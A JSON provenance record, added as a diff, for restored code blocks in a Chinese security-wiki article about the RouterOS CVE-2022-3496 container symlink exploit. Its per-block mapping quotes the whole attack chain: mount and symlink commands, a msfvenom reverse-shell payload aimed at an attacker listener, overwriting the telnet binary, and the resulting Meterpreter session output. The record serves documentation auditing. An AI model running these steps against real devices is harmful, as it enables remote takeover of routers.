@@ -1,0 +1,428 @@
+{
+  "article_path": "Web安全/网络设备/MikroTik RouterOS/利用RouterOS（CVE-2022-3496）漏洞，将符号链接作为挂载入口获取代码执行.md",
+  "answer": "per_item_copy_evidence_and_exact_source_texts_exist; a cache SHA-256 is recorded, but no cache pathname/file was found in the allowed search roots",
+  "scope_searched": [
+    "/tmp/vulwiki-pr6*",
+    "/tmp/vulwiki-full-review-20261003",
+    "repo docs/reviews"
+  ],
+  "no_network_or_execution": true,
+  "current_article_sha256": "5f81e3a6bdc09080283f55afae47b41af1102342fe928929211c38861a0034d7",
+  "current_article_code_fences": 15,
+  "original_empty_blocks_restored": 14,
+  "all_restored_blocks_match_current_exactly": true,
+  "existing_evidence_files": [
+    {
+      "path": "docs/reviews/20261003-empty-block-restoration.json",
+      "sha256": "66f96639dfaff1b3d3cba3ed2d1c4f68e2ea8e45a10110e4b107526887db3347",
+      "article_record": {
+        "path": "Web安全/网络设备/MikroTik RouterOS/利用RouterOS（CVE-2022-3496）漏洞，将符号链接作为挂载入口获取代码执行.md",
+        "blocks_restored": 14,
+        "before_sha256": "f29ff10b01ad04d848c347063a55faf13c4bcaef0afd301dfa683d9f2f5449bc",
+        "after_sha256": "7ee5f901e14293b45a77de772c29cf5fab35d3c2f4982e57cdf1ef63d8f4b3fb",
+        "original_bytes_preserved": true
+      }
+    },
+    {
+      "path": "docs/reviews/20261003-empty-block-dispositions.json",
+      "sha256": "0281d1e44eba5dd2d73911055f4d2a231969c179bbf302999b80eabc134d8698",
+      "article_record": {
+        "path": "Web安全/网络设备/MikroTik RouterOS/利用RouterOS（CVE-2022-3496）漏洞，将符号链接作为挂载入口获取代码执行.md",
+        "original_empty_count_d817": 14,
+        "accepted_count": 14,
+        "candidate_count": 0,
+        "unknown_count": 0,
+        "summary": "14 confirmed restored from author article; no unresolved original fences.",
+        "attempted_public_urls": [
+          "https://blog.nns.ee/2022/08/05/routeros-container-rce/"
+        ],
+        "research_result": "Original NNS/Rasmus Moorats article opened; 14 of 15 source blocks map in order to local blanks, the remaining source directory tree already existed locally. All 14 accepted.",
+        "occurrences": [
+          {
+            "occurrence": 1,
+            "empty_open_line_d817": 60,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 1,
+            "source_text_sha256": "3d74306668531c5b8f3863ae830c1aef724d118b35190bf2a0e26f63301fd7ef",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 2,
+            "empty_open_line_d817": 79,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 3,
+            "source_text_sha256": "79d15fd9dc9111c74d1f376a3ddf96cedb88ebcd0906ffecee03ecab3c06f30a",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 3,
+            "empty_open_line_d817": 85,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 4,
+            "source_text_sha256": "f7d36acc59178d3f2e4ed0d7f591c9119282fef88eaefe9e64140c8991e57167",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 4,
+            "empty_open_line_d817": 89,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 5,
+            "source_text_sha256": "e7f9ee8a218a50df33a7236472c0e55fd740ad84ce25949e5eaa08824c6ee37e",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 5,
+            "empty_open_line_d817": 98,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 6,
+            "source_text_sha256": "49864d8b1c7990e154a6bb52cc4db5e0ebd09470ccf4dac5049224ee489d09d2",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 6,
+            "empty_open_line_d817": 102,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 7,
+            "source_text_sha256": "d86b6d0ff4b8bebdff5854e4de43af3e386b9662392bab5980f6eea8be7b68cb",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 7,
+            "empty_open_line_d817": 109,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 8,
+            "source_text_sha256": "fb5bf211bddafae042c410cbe33023175a65388edf55565577c9f7a6313392a0",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 8,
+            "empty_open_line_d817": 117,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 9,
+            "source_text_sha256": "71d7fc4eb7954b2930235c945e23c5ef20fda915c8d9f0e1e5add624612d67f7",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 9,
+            "empty_open_line_d817": 121,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 10,
+            "source_text_sha256": "182aa960be6e8dbd10c64f558825e558cea4dfecee40ad79c9cc90a61a858d95",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 10,
+            "empty_open_line_d817": 125,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 11,
+            "source_text_sha256": "4e7e2a9f1d7dc03ea43e34322141a6cd8d74ce5701517aa67871a22f82f00ec9",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 11,
+            "empty_open_line_d817": 129,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 12,
+            "source_text_sha256": "f1d21e81841dc0036b3e2b6075fcf22bed06a7bc81c89b18afe3d88ec68abf38",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 12,
+            "empty_open_line_d817": 133,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 13,
+            "source_text_sha256": "eea34cc3cc3d9f437c834127369ef1e7b1b51ef956043359f03c810212ae4bb8",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 13,
+            "empty_open_line_d817": 137,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 14,
+            "source_text_sha256": "0a270ade9d28e9a1217d289155cb9aacf0312f62d773331559ccdb340b99d025",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          },
+          {
+            "occurrence": 14,
+            "empty_open_line_d817": 141,
+            "status": "accepted_restoration",
+            "source_url": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+            "source_block_index": 15,
+            "source_text_sha256": "ef8792d9810bd2d20c2dce7b1e12c8cfbc023677360c68dc453a3c83bda93e0f",
+            "source_cache_sha256": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f"
+          }
+        ]
+      }
+    },
+    {
+      "path": "/tmp/vulwiki-full-review-20261003/agent-3/marked-code-context.jsonl",
+      "sha256": "4e164935e295a23a505d2cf41bd11e81fccd66360b23ba6b13e40ff045e96cf5",
+      "article_record_found": true,
+      "note": "archive vs previous_master vs current fenced-node capture; original archive had empty nodes for 14 restored occurrences"
+    },
+    {
+      "path": "/tmp/vulwiki-full-review-20261003/root-node-ledger.jsonl",
+      "sha256": "54b2145d91d32de6b943cbdff35d5f16237fcf928fbd818b5ef859320380bd87",
+      "article_record": {
+        "path": "Web安全/网络设备/MikroTik RouterOS/利用RouterOS（CVE-2022-3496）漏洞，将符号链接作为挂载入口获取代码执行.md",
+        "shard": 3,
+        "source_sha256": {
+          "archive": "05355b24b4a620c5a7fa61bc8891ef88a992f1eb39e5f660aa67b58916da5c96",
+          "previous_master": "5f81e3a6bdc09080283f55afae47b41af1102342fe928929211c38861a0034d7",
+          "current": "5f81e3a6bdc09080283f55afae47b41af1102342fe928929211c38861a0034d7"
+        },
+        "counts": {
+          "archive": {
+            "codes": 15,
+            "inline": 0,
+            "images": 0
+          },
+          "previous_master": {
+            "codes": 15,
+            "inline": 0,
+            "images": 0
+          },
+          "current": {
+            "codes": 15,
+            "inline": 0,
+            "images": 0
+          }
+        },
+        "archive_current_code_copy_sequence_changed": true,
+        "archive_current_inline_code_changed": false,
+        "archive_current_image_hrefs_changed": false
+      }
+    }
+  ],
+  "source_cache": {
+    "sha256_recorded_for_each_restored_block": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+    "pathname": "unknown; restoration manifest/dispositions record the cache digest but no cache path",
+    "search_result": "The recorded digest and source URL were found in the two docs/reviews manifests; no matching file was found in /tmp/vulwiki-pr6* or /tmp/vulwiki-full-review-20261003. No other /tmp roots were searched."
+  },
+  "per_item_mapping": [
+    {
+      "archive_empty_fence_opening_line": 60,
+      "public_source_block_index": 1,
+      "current_fence_opening_line": 69,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "/container/mounts/add name=etc_pihole src=disk1/etc dst=/etc/pihole",
+      "source_text_sha256_recorded": "3d74306668531c5b8f3863ae830c1aef724d118b35190bf2a0e26f63301fd7ef",
+      "source_text_sha256_recomputed_utf8": "3d74306668531c5b8f3863ae830c1aef724d118b35190bf2a0e26f63301fd7ef",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "MikroTik 文档表明可以在主机和容器之间创建挂载点。例如，etc文件夹下的disk1被挂载到/etc/pihole容器中：  ",
+      "context_after_exact": "这个特性造成了三个相当危险的特定行为。  "
+    },
+    {
+      "archive_empty_fence_opening_line": 79,
+      "public_source_block_index": 3,
+      "current_fence_opening_line": 89,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "# ln -s / /rootfs",
+      "source_text_sha256_recorded": "79d15fd9dc9111c74d1f376a3ddf96cedb88ebcd0906ffecee03ecab3c06f30a",
+      "source_text_sha256_recomputed_utf8": "79d15fd9dc9111c74d1f376a3ddf96cedb88ebcd0906ffecee03ecab3c06f30a",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "假设我的容器的根文件系统存储在disk1/alpine中， 我们在容器内执行以下操作：  ",
+      "context_after_exact": "那么在容器内，根目录将按/rootfs解析。如果在 RouterOS 中设置容器时将此目录用作挂载源，符号链接则将根据设备自己的文件系统进行解析。  "
+    },
+    {
+      "archive_empty_fence_opening_line": 85,
+      "public_source_block_index": 4,
+      "current_fence_opening_line": 96,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "/container/mounts/add name=rootfs src=/disk1/alpine/rootfs dst=/mnt",
+      "source_text_sha256_recorded": "f7d36acc59178d3f2e4ed0d7f591c9119282fef88eaefe9e64140c8991e57167",
+      "source_text_sha256_recomputed_utf8": "f7d36acc59178d3f2e4ed0d7f591c9119282fef88eaefe9e64140c8991e57167",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "例如，我将在容器/mnt目录中挂载主机文件系统：  ",
+      "context_after_exact": "然后，从创建的容器内部就可以访问主机的根文件系统：  "
+    },
+    {
+      "archive_empty_fence_opening_line": 89,
+      "public_source_block_index": 5,
+      "current_fence_opening_line": 101,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "# ls -l /mnt\ntotal 0\ndrwxr-xr-x    2 nobody   nobody         149 Jun 15 11:38 bin\ndrwxr-xr-x    9 nobody   nobody         131 Jun 15 11:38 bndl\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 boot\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 dev\nlrwxrwxrwx    1 nobody   nobody          11 Jun 15 11:38 dude -> /flash/dude\ndrwxr-xr-x    2 nobody   nobody         352 Jun 15 11:38 etc\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 flash\ndrwxr-xr-x    3 nobody   nobody          26 Jun 15 11:38 home\ndrwxr-xr-x    3 nobody   nobody         403 Jun 15 11:38 lib\ndrwxr-xr-x    5 nobody   nobody          73 Jun 15 11:38 nova\nlrwxrwxrwx    1 nobody   nobody           9 Jun 15 11:38 pckg -> /ram/pckg\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 proc\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 ram\nlrwxrwxrwx    1 nobody   nobody           9 Jun 15 11:38 rw -> /flash/rw\ndrwxr-xr-x    2 nobody   nobody          45 Jun 15 11:38 sbin\ndrwxr-xr-x    2 nobody   nobody           3 Jun 15 11:38 sys\nlrwxrwxrwx    1 nobody   nobody           7 Jun 15 11:38 tmp -> /rw/tmp\ndrwxr-xr-x    5 nobody   nobody         111 Jun 15 11:38 var",
+      "source_text_sha256_recorded": "e7f9ee8a218a50df33a7236472c0e55fd740ad84ce25949e5eaa08824c6ee37e",
+      "source_text_sha256_recomputed_utf8": "e7f9ee8a218a50df33a7236472c0e55fd740ad84ce25949e5eaa08824c6ee37e",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "然后，从创建的容器内部就可以访问主机的根文件系统：  ",
+      "context_after_exact": "虽然可以读取文件权限，但大多数文件系统都是只读的，无法写入。  "
+    },
+    {
+      "archive_empty_fence_opening_line": 98,
+      "public_source_block_index": 6,
+      "current_fence_opening_line": 130,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "/container/mounts/add name=robots src=/disk1/alpine/robots.txt dst=/rootfs/home/web/robots.txt",
+      "source_text_sha256_recorded": "49864d8b1c7990e154a6bb52cc4db5e0ebd09470ccf4dac5049224ee489d09d2",
+      "source_text_sha256_recomputed_utf8": "49864d8b1c7990e154a6bb52cc4db5e0ebd09470ccf4dac5049224ee489d09d2",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "例如，我们创建一个挂载点，将容器内部的文件挂载到 webfig 目录，有效地“覆盖”现有的robots.txt：  ",
+      "context_after_exact": "然后，在第三台机器上，我们使用以下命令验证它是否被覆盖curl：  "
+    },
+    {
+      "archive_empty_fence_opening_line": 102,
+      "public_source_block_index": 7,
+      "current_fence_opening_line": 135,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "$ curl router.lan/robots.txt\nHello from inside the container!",
+      "source_text_sha256_recorded": "d86b6d0ff4b8bebdff5854e4de43af3e386b9662392bab5980f6eea8be7b68cb",
+      "source_text_sha256_recomputed_utf8": "d86b6d0ff4b8bebdff5854e4de43af3e386b9662392bab5980f6eea8be7b68cb",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "然后，在第三台机器上，我们使用以下命令验证它是否被覆盖curl：  ",
+      "context_after_exact": "# 利用  "
+    },
+    {
+      "archive_empty_fence_opening_line": 109,
+      "public_source_block_index": 8,
+      "current_fence_opening_line": 144,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "/dev/sda1 /nova/bin/telnet ext4 rw,nosuid,nodev,noexec,relatime 0 0",
+      "source_text_sha256_recorded": "fb5bf211bddafae042c410cbe33023175a65388edf55565577c9f7a6313392a0",
+      "source_text_sha256_recomputed_utf8": "fb5bf211bddafae042c410cbe33023175a65388edf55565577c9f7a6313392a0",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "但是，从/proc/mounts来看，由于挂载点的创建方式，这种方法不起作用：  ",
+      "context_after_exact": "挂载点是使用nosuid、nodev和最重要的noexec选项创建的。这意味着即使您要挂载现有的二进制文件，它也不会被执行，而是每次都会失败并显示“Permission denied”。so共享库同样如此，因此挂载在.so文件上也是不可能的。  "
+    },
+    {
+      "archive_empty_fence_opening_line": 117,
+      "public_source_block_index": 9,
+      "current_fence_opening_line": 153,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "$ cp $(which id) id1\n$ ln -s $(which id) id2\n$ ./id1\nbash: ./id1: Permission denied\n$ ./id2\nuid=1000(xx) gid=1000(xx) groups=1000(xx)",
+      "source_text_sha256_recorded": "71d7fc4eb7954b2930235c945e23c5ef20fda915c8d9f0e1e5add624612d67f7",
+      "source_text_sha256_recomputed_utf8": "71d7fc4eb7954b2930235c945e23c5ef20fda915c8d9f0e1e5add624612d67f7",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "通过测试，如果一个文件系统上存在noexec属性的链接指向文件系统上有执行权限的二进制文件，那么该文件仍将被执行：  ",
+      "context_after_exact": "假设恶意程序可以从某个没有noexec标志的挂载点访问，我们就可以简单地将符号链接挂载到指向我们要运行的恶意二进制文件上。通过查看/proc/mounts，我们可以看到容器自己的根文件系统实际上没有noexec标志（否则将无法在容器内运行可执行文件）：  "
+    },
+    {
+      "archive_empty_fence_opening_line": 121,
+      "public_source_block_index": 10,
+      "current_fence_opening_line": 163,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "/dev/sda1 /flash/rw/container/aa10a963-9715-4c61-967c-7d9f993410e6/root ext4 rw,nosuid,nodev,relatime 0 0",
+      "source_text_sha256_recorded": "182aa960be6e8dbd10c64f558825e558cea4dfecee40ad79c9cc90a61a858d95",
+      "source_text_sha256_recomputed_utf8": "182aa960be6e8dbd10c64f558825e558cea4dfecee40ad79c9cc90a61a858d95",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "假设恶意程序可以从某个没有noexec标志的挂载点访问，我们就可以简单地将符号链接挂载到指向我们要运行的恶意二进制文件上。通过查看/proc/mounts，我们可以看到容器自己的根文件系统实际上没有noexec标志（否则将无法在容器内运行可执行文件）：  ",
+      "context_after_exact": "这就是发起成功攻击所需的mount操作。我们可以用msfvenom生成一个攻击payload：  "
+    },
+    {
+      "archive_empty_fence_opening_line": 125,
+      "public_source_block_index": 11,
+      "current_fence_opening_line": 168,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=10.4.0.245 LPORT=1338 -f elf > rev",
+      "source_text_sha256_recorded": "4e7e2a9f1d7dc03ea43e34322141a6cd8d74ce5701517aa67871a22f82f00ec9",
+      "source_text_sha256_recomputed_utf8": "4e7e2a9f1d7dc03ea43e34322141a6cd8d74ce5701517aa67871a22f82f00ec9",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "这就是发起成功攻击所需的mount操作。我们可以用msfvenom生成一个攻击payload：  ",
+      "context_after_exact": "将它复制到容器中，并创建一个指向其可执行挂载点位置的符号链接：  "
+    },
+    {
+      "archive_empty_fence_opening_line": 129,
+      "public_source_block_index": 12,
+      "current_fence_opening_line": 173,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "ln -s /flash/rw/container/aa10a963-9715-4c61-967c-7d9f993410e6/root/rev /revlnk",
+      "source_text_sha256_recorded": "f1d21e81841dc0036b3e2b6075fcf22bed06a7bc81c89b18afe3d88ec68abf38",
+      "source_text_sha256_recomputed_utf8": "f1d21e81841dc0036b3e2b6075fcf22bed06a7bc81c89b18afe3d88ec68abf38",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "将它复制到容器中，并创建一个指向其可执行挂载点位置的符号链接：  ",
+      "context_after_exact": "由于telnet的优先级相对较低且易于触发和调试，我们将其作为目标二进制文件，再在 RouterOS 中创建挂载点：  "
+    },
+    {
+      "archive_empty_fence_opening_line": 133,
+      "public_source_block_index": 13,
+      "current_fence_opening_line": 178,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "/container/mounts/add name=telnet src=/disk1/alpine/revlnk dst=/rootfs/nova/bin/telnet",
+      "source_text_sha256_recorded": "eea34cc3cc3d9f437c834127369ef1e7b1b51ef956043359f03c810212ae4bb8",
+      "source_text_sha256_recomputed_utf8": "eea34cc3cc3d9f437c834127369ef1e7b1b51ef956043359f03c810212ae4bb8",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "由于telnet的优先级相对较低且易于触发和调试，我们将其作为目标二进制文件，再在 RouterOS 中创建挂载点：  ",
+      "context_after_exact": "启动容器后，二进制文件/nova/bin/telnet被挂载，而且已经是一个指向我们恶意二进制文件的符号链接：  "
+    },
+    {
+      "archive_empty_fence_opening_line": 137,
+      "public_source_block_index": 14,
+      "current_fence_opening_line": 183,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "/nova/bin/telnet -> /flash/rw/container/aa10a963-9715-4c61-967c-7d9f993410e6/root/rev",
+      "source_text_sha256_recorded": "0a270ade9d28e9a1217d289155cb9aacf0312f62d773331559ccdb340b99d025",
+      "source_text_sha256_recomputed_utf8": "0a270ade9d28e9a1217d289155cb9aacf0312f62d773331559ccdb340b99d025",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "启动容器后，二进制文件/nova/bin/telnet被挂载，而且已经是一个指向我们恶意二进制文件的符号链接：  ",
+      "context_after_exact": "正如预期的那样，在/system/telnet 127.0.0.1设备上运行后，我们在 Meterpreter 监听器中建立了连接：  "
+    },
+    {
+      "archive_empty_fence_opening_line": 141,
+      "public_source_block_index": 15,
+      "current_fence_opening_line": 188,
+      "exact_literal_match_current": true,
+      "full_source_block_text": "msf6 exploit(multi/handler) > exploit\n\n[*] Started reverse TCP handler on 10.4.0.245:1338\n[*] Sending stage (908480 bytes) to 10.4.0.1\n[*] Meterpreter session 1 opened (10.4.0.245:1338 -> 10.4.0.1:59434) at 2022-06-21 10:24:34 +0300\n\nmeterpreter > ls\nListing: /\n==========\n\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n040755/rwxr-xr-x  149   dir   2022-06-15 14:38:21 +0300  bin\n040755/rwxr-xr-x  131   dir   2022-06-15 14:38:21 +0300  bndl\n040755/rwxr-xr-x  3     dir   2022-06-15 14:38:21 +0300  boot\n040755/rwxr-xr-x  6140  dir   2022-06-20 21:41:47 +0300  dev\n                                                         dude\n040755/rwxr-xr-x  352   dir   2022-06-15 14:38:21 +0300  etc\n040755/rwxr-xr-x  1024  dir   2022-06-20 21:41:14 +0300  flash\n040755/rwxr-xr-x  26    dir   2022-06-15 14:38:21 +0300  home\n040755/rwxr-xr-x  403   dir   2022-06-15 14:38:21 +0300  lib\n040755/rwxr-xr-x  73    dir   2022-06-15 14:38:21 +0300  nova\n040755/rwxr-xr-x  200   dir   1970-01-01 03:00:12 +0300  pckg\n040555/r-xr-xr-x  0     dir   1970-01-01 03:00:00 +0300  proc\n041777/rwxrwxrwx  400   dir   2022-06-21 08:33:07 +0300  ram\n040755/rwxr-xr-x  1024  dir   1970-01-01 03:00:14 +0300  rw\n040755/rwxr-xr-x  45    dir   2022-06-15 14:38:21 +0300  sbin\n040555/r-xr-xr-x  0     dir   1970-01-01 03:00:12 +0300  sys\n040644/rw-r--r--  1024  dir   1970-01-01 03:00:19 +0300  tmp\n040755/rwxr-xr-x  111   dir   2022-06-15 14:38:21 +0300  var",
+      "source_text_sha256_recorded": "ef8792d9810bd2d20c2dce7b1e12c8cfbc023677360c68dc453a3c83bda93e0f",
+      "source_text_sha256_recomputed_utf8": "ef8792d9810bd2d20c2dce7b1e12c8cfbc023677360c68dc453a3c83bda93e0f",
+      "source_text_hash_matches": true,
+      "source_cache_sha256_recorded": "5760fee8eba869362aaf0639027b03ff8331338301a5a95e4bb69c2d2f569e5f",
+      "source_url_recorded": "https://blog.nns.ee/2022/08/05/routeros-container-rce/",
+      "source_author_or_attribution": "Rasmus Moorats (nns)",
+      "context_before_exact": "正如预期的那样，在/system/telnet 127.0.0.1设备上运行后，我们在 Meterpreter 监听器中建立了连接：  ",
+      "context_after_exact": "这意味着我们可以在设备上成功执行任意代码。  "
+    }
+  ],
+  "scope_note": "The recorded source URL is evidence stored in the local review manifest; it was not opened during this task. The restoration manifest reports 14 accepted blocks, source attribution Rasmus Moorats (nns), and one common cached-source digest. Current source literal bytes (UTF-8 text) were independently compared with the recorded source_block_exact_text and per-block source hash. No article code/commands/PoC were executed."
+}
